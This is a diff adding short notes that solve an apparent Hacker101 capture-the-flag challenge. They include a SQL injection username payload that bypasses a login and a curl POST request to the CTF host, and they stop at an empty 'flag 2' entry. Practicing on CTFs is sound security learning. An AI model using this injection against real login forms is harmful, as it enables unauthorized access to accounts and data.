@@ -1,0 +1,10 @@
+sqli:
+username: ' UNION SELECT 'pass' AS password FROM admins WHERE '1'='1
+password: pass
+
+flag 0: after bypassing login
+flag 1: change GET request to POST request in page 4 
+solution: curl -X POST https://01afbdb589ebaa7fd97980dae128d4c3.ctf.hacker101.com/page/edit/1
+
+-X is to specify request type ( POST, GET ...)
+flag 2:
